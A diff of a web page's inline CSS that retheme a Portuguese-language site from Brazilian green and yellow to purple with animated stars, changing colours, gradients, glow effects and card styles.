@@ -7,7 +7,7 @@
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=Poppins:wght@600;700;800;900&display=swap" rel="stylesheet">
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
     <style>
-        /* ===== TODOS OS ESTILOS EXISTENTES ===== */
+        /* ===== NOVO TEMA ROXO COM ESTRELAS ===== */
         * {
             margin: 0;
             padding: 0;
@@ -15,26 +15,27 @@
         }
 
         :root {
-            --primary: #009739;
-            --primary-dark: #00802e;
-            --primary-light: #00b84a;
-            --secondary: #fedc00;
-            --secondary-dark: #f5c800;
+            --primary: #7c3aed;
+            --primary-dark: #6d28d9;
+            --primary-light: #8b5cf6;
+            --primary-glow: #a78bfa;
+            --secondary: #c084fc;
+            --secondary-dark: #a855f7;
             --accent: #ec4899;
             --success: #10b981;
             --warning: #f59e0b;
             --danger: #ef4444;
-            --dark: #0f172a;
-            --darker: #020617;
+            --dark: #0f0a1a;
+            --darker: #05020a;
             --light: #f8fafc;
             --border: #e2e8f0;
             --text: #1e293b;
             --text-light: #64748b;
             --nav-height: 70px;
-            --gold: #ffd700;
-            --brazil-green: #009739;
-            --brazil-yellow: #fedc00;
-            --brazil-blue: #012169;
+            --gold: #c084fc;
+            --purple-deep: #1a0a2e;
+            --purple-mid: #2d1b4e;
+            --purple-light: #4c2d7a;
         }
 
         html {
@@ -43,14 +44,14 @@
 
         body {
             font-family: 'Inter', sans-serif;
-            background: linear-gradient(135deg, #0a1a0a 0%, #1a2a1a 50%, #0a1a0a 100%);
+            background: linear-gradient(135deg, #0a0615 0%, #1a0a2e 30%, #2d1b4e 60%, #1a0a2e 100%);
             color: var(--text);
             line-height: 1.6;
             overflow-x: hidden;
             min-height: 100vh;
         }
 
-        /* ===== FUNDO ANIMADO BRASIL ===== */
+        /* ===== FUNDO ANIMADO DE ESTRELAS ===== */
         .animated-bg {
             position: fixed;
             inset: 0;
@@ -59,67 +60,82 @@
             pointer-events: none;
         }
 
-        .stars {
+        .stars-container {
             position: absolute;
-            width: 200%;
-            height: 200%;
-            top: -50%;
-            left: -50%;
-            background-image:
-                radial-gradient(2px 2px at 20% 30%, #ffd700, transparent),
-                radial-gradient(2px 2px at 40% 70%, #ffd700, transparent),
-                radial-gradient(2px 2px at 60% 20%, #ffd700, transparent),
-                radial-gradient(2px 2px at 80% 80%, #ffd700, transparent),
-                radial-gradient(1px 1px at 10% 50%, #ffd700, transparent),
-                radial-gradient(1px 1px at 90% 40%, #ffd700, transparent);
-            background-size: 200px 200px;
-            animation: twinkle 4s ease-in-out infinite alternate;
+            width: 100%;
+            height: 100%;
+        }
+
+        .star {
+            position: absolute;
+            background: white;
+            border-radius: 50%;
+            animation: twinkle var(--duration) ease-in-out infinite alternate;
+            opacity: 0;
         }
 
         @keyframes twinkle {
-            0% { opacity: 0.4; }
-            100% { opacity: 1; }
+            0% { opacity: 0.2; transform: scale(0.8); }
+            100% { opacity: 1; transform: scale(1.2); }
+        }
+
+        /* Gerar estrelas via JS, mas deixar algumas fixas */
+        .star-fixed {
+            position: absolute;
+            background: white;
+            border-radius: 50%;
+            animation: twinkle 3s ease-in-out infinite alternate;
         }
 
         .glow-orb {
             position: absolute;
             border-radius: 50%;
-            filter: blur(100px);
-            opacity: 0.2;
-            animation: floatGlow 12s ease-in-out infinite alternate;
+            filter: blur(120px);
+            opacity: 0.3;
+            animation: floatGlow 15s ease-in-out infinite alternate;
         }
 
         .glow-1 {
-            width: 500px;
-            height: 500px;
-            background: var(--brazil-green);
-            top: -15%;
-            left: -10%;
+            width: 600px;
+            height: 600px;
+            background: var(--primary);
+            top: -20%;
+            left: -15%;
         }
 
         .glow-2 {
-            width: 400px;
-            height: 400px;
-            background: var(--brazil-yellow);
-            bottom: -15%;
-            right: -10%;
-            animation-delay: -4s;
+            width: 500px;
+            height: 500px;
+            background: var(--secondary);
+            bottom: -20%;
+            right: -15%;
+            animation-delay: -5s;
         }
 
         .glow-3 {
-            width: 300px;
-            height: 300px;
-            background: var(--brazil-blue);
+            width: 400px;
+            height: 400px;
+            background: var(--accent);
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
-            animation-delay: -8s;
-            opacity: 0.1;
+            animation-delay: -10s;
+            opacity: 0.15;
+        }
+
+        .glow-4 {
+            width: 300px;
+            height: 300px;
+            background: #8b5cf6;
+            top: 30%;
+            right: 10%;
+            animation-delay: -3s;
+            opacity: 0.2;
         }
 
         @keyframes floatGlow {
             0% { transform: translate(0, 0) scale(1); }
-            100% { transform: translate(40px, -40px) scale(1.2); }
+            100% { transform: translate(50px, -50px) scale(1.3); }
         }
 
         /* ===== ANIMAÇÕES ===== */
@@ -141,17 +157,6 @@
         @keyframes scaleIn {
             from { opacity: 0; transform: scale(0.9); }
             to { opacity: 1; transform: scale(1); }
-        }
-
-        @keyframes float {
-            0%, 100% { transform: translateY(0px); }
-            50% { transform: translateY(-20px); }
-        }
-
-        @keyframes floatRotate {
-            0% { transform: translateY(0) rotate(0deg); }
-            50% { transform: translateY(-30px) rotate(180deg); }
-            100% { transform: translateY(0) rotate(360deg); }
         }
 
         @keyframes pulse {
@@ -180,24 +185,29 @@
             to { width: 100%; }
         }
 
+        @keyframes floatStar {
+            0%, 100% { transform: translateY(0px) rotate(0deg); }
+            50% { transform: translateY(-20px) rotate(180deg); }
+        }
+
         /* ===== SCROLLBAR ===== */
         ::-webkit-scrollbar { width: 8px; }
-        ::-webkit-scrollbar-track { background: var(--dark); }
+        ::-webkit-scrollbar-track { background: var(--darker); }
         ::-webkit-scrollbar-thumb { background: var(--primary); border-radius: 10px; }
         ::-webkit-scrollbar-thumb:hover { background: var(--primary-light); }
 
         /* ===== NAVBAR ===== */
         .navbar {
-            background: rgba(10, 26, 10, 0.95);
+            background: rgba(10, 6, 21, 0.95);
             backdrop-filter: blur(20px);
             -webkit-backdrop-filter: blur(20px);
-            border-bottom: 2px solid rgba(254, 220, 0, 0.2);
+            border-bottom: 2px solid rgba(124, 58, 237, 0.3);
             position: sticky;
             top: 0;
             z-index: 1000;
             padding: 0.8rem 0;
             animation: slideDown 0.6s ease-out;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
             transition: background 0.3s ease;
             height: var(--nav-height);
             display: flex;
@@ -220,32 +230,40 @@
             gap: 0.5rem;
             font-size: 1.3rem;
             font-weight: 900;
-            background: linear-gradient(135deg, #009739, #fedc00, #012169);
-            background-size: 200% 200%;
+            background: linear-gradient(135deg, #7c3aed, #c084fc, #8b5cf6, #ec4899);
+            background-size: 300% 300%;
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             background-clip: text;
             cursor: pointer;
             flex-shrink: 0;
+            animation: gradientShift 4s ease-in-out infinite;
+        }
+
+        @keyframes gradientShift {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
         }
 
         .nav-logo i {
             font-size: 1.5rem;
-            color: #fedc00;
+            color: #c084fc;
             -webkit-text-fill-color: initial;
         }
 
         .nav-menu {
             display: flex;
-            gap: 0.5rem;
+            gap: 0.3rem;
             align-items: center;
+            flex-wrap: wrap;
         }
 
         .nav-link {
             color: rgba(255, 255, 255, 0.7);
             text-decoration: none;
             font-weight: 600;
-            font-size: 0.8rem;
+            font-size: 0.75rem;
             transition: all 0.3s ease;
             position: relative;
             padding: 0.4rem 0.7rem;
@@ -265,13 +283,13 @@
             transform: translateX(-50%);
             width: 0;
             height: 2px;
-            background: linear-gradient(90deg, #009739, #fedc00);
+            background: linear-gradient(90deg, #7c3aed, #c084fc);
             transition: width 0.3s ease;
         }
 
         .nav-link:hover {
             color: white;
-            background: rgba(255, 255, 255, 0.05);
+            background: rgba(124, 58, 237, 0.15);
         }
 
         .nav-link:hover::before {
@@ -279,17 +297,17 @@
         }
 
         .nav-link.active {
-            color: #fedc00;
-            background: rgba(254, 220, 0, 0.1);
+            color: #c084fc;
+            background: rgba(124, 58, 237, 0.2);
         }
 
         .nav-link.active::before {
             width: 60%;
-            background: #fedc00;
+            background: #c084fc;
         }
 
         .nav-link i {
-            font-size: 0.8rem;
+            font-size: 0.75rem;
         }
 
         .nav-toggle {
@@ -343,9 +361,9 @@
             display: inline-flex;
             align-items: center;
             gap: 0.5rem;
-            background: rgba(254, 220, 0, 0.15);
-            border: 1px solid rgba(254, 220, 0, 0.4);
-            color: #fedc00;
+            background: rgba(124, 58, 237, 0.2);
+            border: 1px solid rgba(192, 132, 252, 0.4);
+            color: #c084fc;
             padding: 0.5rem 1.2rem;
             border-radius: 50px;
             font-size: 0.8rem;
@@ -361,7 +379,7 @@
             font-weight: 900;
             line-height: 1.1;
             margin-bottom: 1rem;
-            background: linear-gradient(135deg, #fedc00 0%, #009739 40%, #012169 70%, #ffd700 100%);
+            background: linear-gradient(135deg, #c084fc 0%, #7c3aed 40%, #8b5cf6 70%, #ec4899 100%);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             background-clip: text;
@@ -375,10 +393,9 @@
             animation: fadeInUp 0.8s ease-out 0.2s both;
         }
 
-        .hero-subtitle .hexa {
-            color: #fedc00;
-            font-weight: 900;
-            text-shadow: 0 0 20px rgba(254, 220, 0, 0.3);
+        .hero-subtitle .star-icon {
+            color: #c084fc;
+            text-shadow: 0 0 20px rgba(124, 58, 237, 0.3);
         }
 
         .hero-description {
@@ -407,21 +424,22 @@
             color: rgba(255, 255, 255, 0.8);
             font-weight: 600;
             font-size: 0.85rem;
-            background: rgba(254, 220, 0, 0.1);
+            background: rgba(124, 58, 237, 0.15);
             padding: 0.5rem 1.2rem;
             border-radius: 8px;
-            border: 1px solid rgba(254, 220, 0, 0.2);
+            border: 1px solid rgba(124, 58, 237, 0.3);
             transition: all 0.3s ease;
         }
 
         .feature-badge:hover {
-            background: rgba(254, 220, 0, 0.2);
-            border-color: rgba(254, 220, 0, 0.4);
+            background: rgba(124, 58, 237, 0.25);
+            border-color: rgba(192, 132, 252, 0.5);
             transform: translateY(-3px);
+            box-shadow: 0 10px 30px rgba(124, 58, 237, 0.2);
         }
 
         .feature-badge i {
-            color: #fedc00;
+            color: #c084fc;
             font-size: 1rem;
         }
 
@@ -460,15 +478,15 @@
         }
 
         .btn-primary {
-            background: linear-gradient(135deg, #009739, #00802e);
+            background: linear-gradient(135deg, #7c3aed, #6d28d9);
             color: white;
-            box-shadow: 0 10px 30px rgba(0, 151, 57, 0.3);
-            border: 1px solid rgba(254, 220, 0, 0.3);
+            box-shadow: 0 10px 30px rgba(124, 58, 237, 0.4);
+            border: 1px solid rgba(192, 132, 252, 0.3);
         }
 
         .btn-primary:hover {
             transform: translateY(-3px);
-            box-shadow: 0 15px 40px rgba(0, 151, 57, 0.5);
+            box-shadow: 0 15px 40px rgba(124, 58, 237, 0.6);
         }
 
         .btn-primary:active {
@@ -495,7 +513,7 @@
             font-weight: 900;
             text-align: center;
             margin-bottom: 0.8rem;
-            background: linear-gradient(135deg, #fedc00 0%, #009739 40%, #012169 70%, #ffd700 100%);
+            background: linear-gradient(135deg, #c084fc 0%, #7c3aed 40%, #8b5cf6 70%, #ec4899 100%);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             background-clip: text;
@@ -518,10 +536,10 @@
         }
 
         .card {
-            background: linear-gradient(135deg, rgba(255, 255, 255, 0.08), rgba(255, 255, 255, 0.02));
+            background: linear-gradient(135deg, rgba(124, 58, 237, 0.12), rgba(124, 58, 237, 0.03));
             backdrop-filter: blur(20px);
             -webkit-backdrop-filter: blur(20px);
-            border: 1px solid rgba(254, 220, 0, 0.15);
+            border: 1px solid rgba(124, 58, 237, 0.2);
             border-radius: 16px;
             padding: 2rem;
             transition: all 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
@@ -532,13 +550,12 @@
         }
 
         .card::before {
-            content: '';
+            content: '✦';
             position: absolute;
-            top: -50%;
-            right: -50%;
-            width: 200%;
-            height: 200%;
-            background: radial-gradient(circle, rgba(0, 151, 57, 0.1) 0%, transparent 70%);
+            top: -20%;
+            right: -10%;
+            font-size: 8rem;
+            color: rgba(124, 58, 237, 0.05);
             opacity: 0;
             transition: opacity 0.4s ease;
         }
@@ -551,18 +568,20 @@
         .card:nth-child(2) { animation-delay: 0.2s; }
         .card:nth-child(3) { animation-delay: 0.3s; }
         .card:nth-child(4) { animation-delay: 0.4s; }
+        .card:nth-child(5) { animation-delay: 0.5s; }
+        .card:nth-child(6) { animation-delay: 0.6s; }
 
         .card:hover {
-            background: linear-gradient(135deg, rgba(255, 255, 255, 0.12), rgba(255, 255, 255, 0.05));
-            border-color: rgba(254, 220, 0, 0.4);
+            background: linear-gradient(135deg, rgba(124, 58, 237, 0.2), rgba(124, 58, 237, 0.06));
+            border-color: rgba(192, 132, 252, 0.4);
             transform: translateY(-8px);
-            box-shadow: 0 20px 40px rgba(0, 151, 57, 0.25);
+            box-shadow: 0 20px 40px rgba(124, 58, 237, 0.25);
         }
 
         .card-icon {
             width: 60px;
             height: 60px;
-            background: linear-gradient(135deg, #009739, #00802e);
+            background: linear-gradient(135deg, #7c3aed, #6d28d9);
             border-radius: 14px;
             display: flex;
             align-items: center;
@@ -570,12 +589,13 @@
             font-size: 1.7rem;
             color: white;
             margin-bottom: 1.2rem;
-            box-shadow: 0 10px 30px rgba(0, 151, 57, 0.3);
+            box-shadow: 0 10px 30px rgba(124, 58, 237, 0.3);
             transition: all 0.3s ease;
         }
 
         .card:hover .card-icon {
             transform: scale(1.1) rotate(10deg);
+            box-shadow: 0 15px 40px rgba(124, 58, 237, 0.4);
         }
 
         .card-title {
@@ -601,16 +621,26 @@
         }
 
         .main-card {
-            background: linear-gradient(135deg, rgba(255, 255, 255, 0.08), rgba(255, 255, 255, 0.02));
+            background: linear-gradient(135deg, rgba(124, 58, 237, 0.12), rgba(124, 58, 237, 0.03));
             backdrop-filter: blur(20px);
             -webkit-backdrop-filter: blur(20px);
-            border: 1px solid rgba(254, 220, 0, 0.15);
+            border: 1px solid rgba(124, 58, 237, 0.2);
             border-radius: 20px;
             padding: 2rem;
             animation: slideInLeft 0.8s ease-out;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.4);
             position: relative;
             overflow: hidden;
+        }
+
+        .main-card::before {
+            content: '✦';
+            position: absolute;
+            top: -30%;
+            right: -20%;
+            font-size: 15rem;
+            color: rgba(124, 58, 237, 0.03);
+            pointer-events: none;
         }
 
         .card-header {
@@ -619,7 +649,7 @@
             align-items: center;
             margin-bottom: 2rem;
             padding-bottom: 1.5rem;
-            border-bottom: 1px solid rgba(254, 220, 0, 0.1);
+            border-bottom: 1px solid rgba(124, 58, 237, 0.15);
             flex-wrap: wrap;
             gap: 0.8rem;
         }
@@ -632,13 +662,13 @@
         }
 
         .badge {
-            background: linear-gradient(135deg, #009739, #fedc00);
-            color: #012169;
+            background: linear-gradient(135deg, #7c3aed, #c084fc);
+            color: white;
             padding: 0.4rem 1.2rem;
             border-radius: 50px;
             font-size: 0.75rem;
             font-weight: 900;
-            box-shadow: 0 10px 25px rgba(0, 151, 57, 0.3);
+            box-shadow: 0 10px 25px rgba(124, 58, 237, 0.3);
             animation: bounceIn 0.6s ease-out;
             white-space: nowrap;
         }
@@ -658,7 +688,7 @@
         }
 
         .form-label i {
-            color: #fedc00;
+            color: #c084fc;
             font-size: 1rem;
         }
 
@@ -672,7 +702,7 @@
             width: 100%;
             padding: 0.9rem 1rem;
             background: rgba(255, 255, 255, 0.05);
-            border: 1.5px solid rgba(254, 220, 0, 0.2);
+            border: 1.5px solid rgba(124, 58, 237, 0.3);
             border-radius: 12px;
             color: white;
             font-size: 0.95rem;
@@ -686,8 +716,8 @@
         .form-input:focus {
             outline: none;
             background: rgba(255, 255, 255, 0.08);
-            border-color: rgba(0, 151, 57, 0.6);
-            box-shadow: 0 0 0 4px rgba(0, 151, 57, 0.15);
+            border-color: rgba(124, 58, 237, 0.6);
+            box-shadow: 0 0 0 4px rgba(124, 58, 237, 0.15);
         }
 
         .form-input::placeholder {
@@ -707,7 +737,7 @@
         }
 
         .toggle-btn:hover {
-            color: #fedc00;
+            color: #c084fc;
         }
 
         .form-hint {
@@ -719,8 +749,8 @@
         }
 
         .security-box {
-            background: linear-gradient(135deg, rgba(0, 151, 57, 0.15), rgba(0, 151, 57, 0.05));
-            border: 1.5px solid rgba(0, 151, 57, 0.3);
+            background: linear-gradient(135deg, rgba(124, 58, 237, 0.15), rgba(124, 58, 237, 0.05));
+            border: 1.5px solid rgba(124, 58, 237, 0.3);
             border-radius: 12px;
             padding: 1.2rem;
             display: flex;
@@ -730,7 +760,7 @@
         }
 
         .security-box i {
-            color: #00b84a;
+            color: #a78bfa;
             font-size: 1.3rem;
             flex-shrink: 0;
             margin-top: 0.2rem;
@@ -743,7 +773,7 @@
         }
 
         .security-box strong {
-            color: #fedc00;
+            color: #c084fc;
         }
 
         .btn-block {
@@ -759,14 +789,14 @@
         }
 
         .disclaimer a {
-            color: #fedc00;
+            color: #c084fc;
             text-decoration: none;
             font-weight: 700;
             transition: color 0.3s ease;
         }
 
         .disclaimer a:hover {
-            color: #ffd700;
+            color: #a78bfa;
         }
 
         /* ===== BLOQUEIO MESSAGE ===== */
@@ -806,7 +836,7 @@
         .block-message .timer {
             font-size: 2rem;
             font-weight: 900;
-            color: #fedc00;
+            color: #c084fc;
             margin: 0.5rem 0;
         }
 
@@ -818,14 +848,14 @@
         }
 
         .info-card {
-            background: linear-gradient(135deg, rgba(255, 255, 255, 0.08), rgba(255, 255, 255, 0.02));
+            background: linear-gradient(135deg, rgba(124, 58, 237, 0.12), rgba(124, 58, 237, 0.03));
             backdrop-filter: blur(20px);
             -webkit-backdrop-filter: blur(20px);
-            border: 1px solid rgba(254, 220, 0, 0.15);
+            border: 1px solid rgba(124, 58, 237, 0.2);
             border-radius: 16px;
             padding: 1.5rem;
             animation: slideInRight 0.8s ease-out;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.2);
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
         }
 
         .info-card h4 {
@@ -839,7 +869,7 @@
         }
 
         .info-card h4 i {
-            color: #fedc00;
+            color: #c084fc;
         }
 
         .info-item {
@@ -847,7 +877,7 @@
             justify-content: space-between;
             align-items: center;
             padding: 0.6rem 0;
-            border-bottom: 1px solid rgba(254, 220, 0, 0.05);
+            border-bottom: 1px solid rgba(124, 58, 237, 0.08);
             transition: all 0.3s ease;
         }
 
@@ -866,7 +896,7 @@
         }
 
         .info-value {
-            color: #fedc00;
+            color: #c084fc;
             font-weight: 800;
             font-size: 1rem;
         }
@@ -892,7 +922,7 @@
         }
 
         .features-list i {
-            color: #00b84a;
+            color: #a78bfa;
             font-weight: 700;
         }
 
@@ -902,8 +932,8 @@
             gap: 0.4rem;
             font-size: 0.75rem;
             font-weight: 700;
-            color: #00b84a;
-            background: rgba(0, 151, 57, 0.1);
+            color: #a78bfa;
+            background: rgba(124, 58, 237, 0.15);
             padding: 0.3rem 0.8rem;
             border-radius: 50px;
             width: fit-content;
@@ -922,10 +952,10 @@
         }
 
         .faq-item {
-            background: linear-gradient(135deg, rgba(255, 255, 255, 0.08), rgba(255, 255, 255, 0.02));
+            background: linear-gradient(135deg, rgba(124, 58, 237, 0.12), rgba(124, 58, 237, 0.03));
             backdrop-filter: blur(20px);
             -webkit-backdrop-filter: blur(20px);
-            border: 1px solid rgba(254, 220, 0, 0.15);
+            border: 1px solid rgba(124, 58, 237, 0.2);
             border-radius: 14px;
             overflow: hidden;
             transition: all 0.4s ease;
@@ -941,8 +971,8 @@
         .faq-item:nth-child(6) { animation-delay: 0.6s; }
 
         .faq-item:hover {
-            background: linear-gradient(135deg, rgba(255, 255, 255, 0.12), rgba(255, 255, 255, 0.05));
-            border-color: rgba(0, 151, 57, 0.3);
+            background: linear-gradient(135deg, rgba(124, 58, 237, 0.2), rgba(124, 58, 237, 0.06));
+            border-color: rgba(124, 58, 237, 0.4);
             transform: translateY(-5px);
         }
 
@@ -958,7 +988,7 @@
         }
 
         .faq-question:hover {
-            background: rgba(0, 151, 57, 0.05);
+            background: rgba(124, 58, 237, 0.05);
         }
 
         .faq-question h3 {
@@ -969,7 +999,7 @@
         }
 
         .faq-question i {
-            color: #fedc00;
+            color: #c084fc;
             transition: all 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
             font-size: 1rem;
             flex-shrink: 0;
@@ -978,7 +1008,7 @@
 
         .faq-item.active .faq-question i {
             transform: rotate(180deg);
-            color: #009739;
+            color: #7c3aed;
         }
 
         .faq-answer {
@@ -1007,10 +1037,10 @@
         }
 
         .stat-box {
-            background: linear-gradient(135deg, rgba(255, 255, 255, 0.08), rgba(255, 255, 255, 0.02));
+            background: linear-gradient(135deg, rgba(124, 58, 237, 0.12), rgba(124, 58, 237, 0.03));
             backdrop-filter: blur(20px);
             -webkit-backdrop-filter: blur(20px);
-            border: 1px solid rgba(254, 220, 0, 0.15);
+            border: 1px solid rgba(124, 58, 237, 0.2);
             border-radius: 16px;
             padding: 2rem;
             text-align: center;
@@ -1022,13 +1052,12 @@
         }
 
         .stat-box::before {
-            content: '';
+            content: '✦';
             position: absolute;
-            top: -50%;
-            right: -50%;
-            width: 200%;
-            height: 200%;
-            background: radial-gradient(circle, rgba(254, 220, 0, 0.1) 0%, transparent 70%);
+            top: -30%;
+            right: -20%;
+            font-size: 8rem;
+            color: rgba(124, 58, 237, 0.05);
             opacity: 0;
             transition: opacity 0.4s ease;
         }
@@ -1042,17 +1071,17 @@
         .stat-box:nth-child(3) { animation-delay: 0.3s; }
 
         .stat-box:hover {
-            background: linear-gradient(135deg, rgba(255, 255, 255, 0.12), rgba(255, 255, 255, 0.05));
-            border-color: rgba(254, 220, 0, 0.4);
+            background: linear-gradient(135deg, rgba(124, 58, 237, 0.2), rgba(124, 58, 237, 0.06));
+            border-color: rgba(192, 132, 252, 0.4);
             transform: translateY(-8px);
-            box-shadow: 0 20px 40px rgba(254, 220, 0, 0.25);
+            box-shadow: 0 20px 40px rgba(124, 58, 237, 0.25);
         }
 
         .stat-number {
             display: block;
             font-size: clamp(1.8rem, 4vw, 2.8rem);
             font-weight: 900;
-            background: linear-gradient(135deg, #fedc00, #009739);
+            background: linear-gradient(135deg, #c084fc, #7c3aed);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             background-clip: text;
@@ -1075,10 +1104,10 @@
         }
 
         .comunidade-card {
-            background: linear-gradient(135deg, rgba(255, 255, 255, 0.08), rgba(255, 255, 255, 0.02));
+            background: linear-gradient(135deg, rgba(124, 58, 237, 0.12), rgba(124, 58, 237, 0.03));
             backdrop-filter: blur(20px);
             -webkit-backdrop-filter: blur(20px);
-            border: 1px solid rgba(254, 220, 0, 0.15);
+            border: 1px solid rgba(124, 58, 237, 0.2);
             border-radius: 16px;
             padding: 2rem;
             text-align: center;
@@ -1093,10 +1122,10 @@
         .comunidade-card:nth-child(3) { animation-delay: 0.3s; }
 
         .comunidade-card:hover {
-            background: linear-gradient(135deg, rgba(255, 255, 255, 0.12), rgba(255, 255, 255, 0.05));
-            border-color: rgba(0, 151, 57, 0.4);
+            background: linear-gradient(135deg, rgba(124, 58, 237, 0.2), rgba(124, 58, 237, 0.06));
+            border-color: rgba(192, 132, 252, 0.4);
             transform: translateY(-8px);
-            box-shadow: 0 20px 40px rgba(0, 151, 57, 0.25);
+            box-shadow: 0 20px 40px rgba(124, 58, 237, 0.25);
         }
 
         .comunidade-icon {
@@ -1118,6 +1147,7 @@
         .comunidade-icon.discord { background: linear-gradient(135deg, #5865F2, #4752C4); color: white; }
         .comunidade-icon.email { background: linear-gradient(135deg, #ea4335, #c5221f); color: white; }
         .comunidade-icon.tiktok { background: linear-gradient(135deg, #000000, #1a1a1a); color: #25f4ee; border: 2px solid #25f4ee; }
+        .comunidade-icon.github { background: linear-gradient(135deg, #333, #000); color: white; border: 2px solid #c084fc; }
 
         .comunidade-card h3 {
             color: white;
@@ -1136,7 +1166,7 @@
         .comunidade-card .btn-comunidade {
             background: rgba(255, 255, 255, 0.05);
             color: rgba(255, 255, 255, 0.8);
-            border: 1.5px solid rgba(254, 220, 0, 0.1);
+            border: 1.5px solid rgba(124, 58, 237, 0.2);
             border-radius: 10px;
             padding: 0.7rem 1.5rem;
             font-weight: 700;
@@ -1153,17 +1183,17 @@
         }
 
         .comunidade-card:hover .btn-comunidade {
-            background: rgba(0, 151, 57, 0.15);
-            border-color: rgba(0, 151, 57, 0.4);
-            color: #fedc00;
+            background: rgba(124, 58, 237, 0.2);
+            border-color: rgba(192, 132, 252, 0.4);
+            color: #c084fc;
         }
 
         .email-info {
             margin-top: 1rem;
             padding: 0.8rem;
-            background: rgba(0, 151, 57, 0.1);
+            background: rgba(124, 58, 237, 0.1);
             border-radius: 10px;
-            border: 1px solid rgba(0, 151, 57, 0.2);
+            border: 1px solid rgba(124, 58, 237, 0.2);
         }
 
         .email-info p {
@@ -1176,14 +1206,14 @@
         }
 
         .email-info i {
-            color: #fedc00;
+            color: #c084fc;
         }
 
         /* ===== TERMS & PRIVACY MODAL ===== */
         .terms-modal-overlay {
             position: fixed;
             inset: 0;
-            background: rgba(0, 0, 0, 0.85);
+            background: rgba(0, 0, 0, 0.9);
             backdrop-filter: blur(15px);
             -webkit-backdrop-filter: blur(15px);
             display: none;
@@ -1199,10 +1229,10 @@
         }
 
         .terms-modal-content {
-            background: linear-gradient(135deg, rgba(10, 26, 10, 0.98), rgba(26, 42, 26, 0.98));
+            background: linear-gradient(135deg, rgba(10, 6, 21, 0.98), rgba(26, 10, 46, 0.98));
             backdrop-filter: blur(20px);
             -webkit-backdrop-filter: blur(20px);
-            border: 1px solid rgba(254, 220, 0, 0.15);
+            border: 1px solid rgba(124, 58, 237, 0.3);
             border-radius: 20px;
             padding: 2.5rem;
             max-width: 700px;
@@ -1219,10 +1249,14 @@
             font-family: 'Poppins', sans-serif;
             margin-bottom: 1.5rem;
             text-align: center;
+            background: linear-gradient(135deg, #c084fc, #7c3aed);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
         }
 
         .terms-modal-content h3 {
-            color: #fedc00;
+            color: #c084fc;
             font-size: 1.1rem;
             font-weight: 700;
             margin: 1.5rem 0 0.8rem;
@@ -1271,13 +1305,13 @@
         }
 
         .terms-modal-content .terms-actions .btn-primary-modal {
-            background: linear-gradient(135deg, #009739, #00802e);
+            background: linear-gradient(135deg, #7c3aed, #6d28d9);
             color: white;
         }
 
         .terms-modal-content .terms-actions .btn-primary-modal:hover {
             transform: translateY(-2px);
-            box-shadow: 0 10px 30px rgba(0, 151, 57, 0.4);
+            box-shadow: 0 10px 30px rgba(124, 58, 237, 0.4);
         }
 
         .terms-close-btn {
@@ -1304,10 +1338,10 @@
         }
 
         .donation-card {
-            background: linear-gradient(135deg, rgba(255, 255, 255, 0.08), rgba(255, 255, 255, 0.02));
+            background: linear-gradient(135deg, rgba(124, 58, 237, 0.12), rgba(124, 58, 237, 0.03));
             backdrop-filter: blur(20px);
             -webkit-backdrop-filter: blur(20px);
-            border: 1px solid rgba(254, 220, 0, 0.15);
+            border: 1px solid rgba(124, 58, 237, 0.2);
             border-radius: 16px;
             padding: 1.8rem;
             text-align: center;
@@ -1320,12 +1354,13 @@
         }
 
         .donation-card::after {
-            content: '🔒';
+            content: '✦';
             position: absolute;
             top: 10px;
             right: 10px;
-            font-size: 1rem;
-            opacity: 0.5;
+            font-size: 1.2rem;
+            opacity: 0.3;
+            color: #c084fc;
         }
 
         .donation-card.desativado {
@@ -1345,7 +1380,7 @@
             justify-content: center;
             font-size: 1.2rem;
             font-weight: 900;
-            color: #fedc00;
+            color: #c084fc;
             z-index: 10;
             border-radius: 16px;
         }
@@ -1356,23 +1391,23 @@
         .donation-card:nth-child(4) { animation-delay: 0.4s; }
 
         .donation-card:hover:not(.desativado) {
-            background: linear-gradient(135deg, rgba(255, 255, 255, 0.12), rgba(255, 255, 255, 0.05));
-            border-color: rgba(0, 151, 57, 0.3);
+            background: linear-gradient(135deg, rgba(124, 58, 237, 0.2), rgba(124, 58, 237, 0.06));
+            border-color: rgba(192, 132, 252, 0.4);
             transform: translateY(-8px);
         }
 
         .donation-icon {
             width: 70px;
             height: 70px;
-            background: linear-gradient(135deg, #009739, #fedc00);
+            background: linear-gradient(135deg, #7c3aed, #c084fc);
             border-radius: 16px;
             display: flex;
             align-items: center;
             justify-content: center;
             font-size: 2rem;
-            color: #012169;
+            color: white;
             margin: 0 auto 1.2rem;
-            box-shadow: 0 10px 30px rgba(0, 151, 57, 0.3);
+            box-shadow: 0 10px 30px rgba(124, 58, 237, 0.3);
             transition: all 0.3s ease;
         }
 
@@ -1394,19 +1429,19 @@
         }
 
         .btn-secondary {
-            background: rgba(0, 151, 57, 0.15);
-            color: #fedc00;
-            border: 1.5px solid rgba(0, 151, 57, 0.4);
+            background: rgba(124, 58, 237, 0.15);
+            color: #c084fc;
+            border: 1.5px solid rgba(124, 58, 237, 0.4);
             backdrop-filter: blur(10px);
             -webkit-backdrop-filter: blur(10px);
             width: 100%;
         }
 
         .btn-secondary:hover:not(:disabled) {
-            background: rgba(0, 151, 57, 0.25);
-            border-color: rgba(0, 151, 57, 0.6);
+            background: rgba(124, 58, 237, 0.25);
+            border-color: rgba(124, 58, 237, 0.6);
             transform: translateY(-3px);
-            color: #ffd700;
+            color: #a78bfa;
         }
 
         .btn-secondary:disabled {
@@ -1414,10 +1449,174 @@
             cursor: not-allowed;
         }
 
